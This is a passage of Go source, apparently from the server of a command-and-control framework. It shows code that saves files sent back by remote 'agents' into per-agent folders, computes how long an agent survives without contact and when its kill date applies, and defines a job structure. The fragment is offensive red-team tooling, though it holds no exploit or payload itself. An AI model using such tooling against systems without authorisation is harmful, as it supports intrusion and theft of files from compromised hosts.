			Log(m.ID, errorMessage.Error())
			return errorMessage
		}
		message("success", fmt.Sprintf("Results for job %s", p.Job))
		downloadBlob, downloadBlobErr := base64.StdEncoding.DecodeString(p.FileBlob)

		if downloadBlobErr != nil {
			errorMessage := fmt.Errorf("there was an error decoding the fileBlob:\r\n%s", downloadBlobErr.Error())
			Log(m.ID, errorMessage.Error())
			return errorMessage
		}
		downloadFile := filepath.Join(agentsDir, m.ID.String(), f)
		writingErr := ioutil.WriteFile(downloadFile, downloadBlob, 0644)
		if writingErr != nil {
			errorMessage := fmt.Errorf("there was an error writing to -> %s:\r\n%s", p.FileLocation, writingErr.Error())
			Log(m.ID, errorMessage.Error())
			return errorMessage
		}
		successMessage := fmt.Sprintf("Successfully downloaded file %s with a size of %d bytes from agent %s to %s",
			p.FileLocation,
			len(downloadBlob),
			m.ID.String(),
			downloadFile)

		message("success", successMessage)
		Log(m.ID, successMessage)
	}
	if core.Debug {
		message("debug", "Leaving agents.FileTransfer")
	}
	return nil
}

// GetLifetime returns the amount an agent could live without successfully communicating with the server
func GetLifetime(agentID uuid.UUID) (time.Duration, error) {
	if core.Debug {
		message("debug", "Entering into agents.GetLifeTime")
	}
	// Check to make sure it is a known agent
	if !isAgent(agentID) {
		return 0, fmt.Errorf("%s is not a known agent", agentID)
	}

	// Check to see if PID is set to know if the first AgentInfo message has been sent
	if Agents[agentID].Pid == 0 {
		return 0, nil
	}

	sleep, errSleep := time.ParseDuration(Agents[agentID].WaitTime)
	if errSleep != nil {
		return 0, fmt.Errorf("there was an error parsing the agent WaitTime to a duration:\r\n%s", errSleep.Error())
	}
	if sleep == 0 {
		return 0, fmt.Errorf("agent WaitTime is equal to zero")
	}

	retry := Agents[agentID].MaxRetry
	if retry == 0 {
		return 0, fmt.Errorf("agent MaxRetry is equal to zero")
	}

	skew := time.Duration(Agents[agentID].Skew) * time.Millisecond
	maxRetry := Agents[agentID].MaxRetry

	// Calculate the worst case scenario that an agent could be alive before dying
	lifetime := sleep + skew
	for maxRetry > 1 {
		lifetime = lifetime + (sleep + skew)
		maxRetry--
	}

	if Agents[agentID].KillDate > 0 {
		if time.Now().Add(lifetime).After(time.Unix(Agents[agentID].KillDate, 0)) {
			return 0, fmt.Errorf("the agent lifetime will exceed the killdate")
		}
	}

	if core.Debug {
		message("debug", "Leaving agents.GetLifeTime without error")
	}

	return lifetime, nil

}

// Job is a structure for holding data for single task assigned to a single agent
type Job struct {
	ID      string
	Type    string
	Status  string // Valid Statuses are created, sent, returned //TODO this might not be needed
	Args    []string
	Created time.Time
}

// TODO configure all message to be displayed on the CLI to be returned as errors and not written to the CLI here
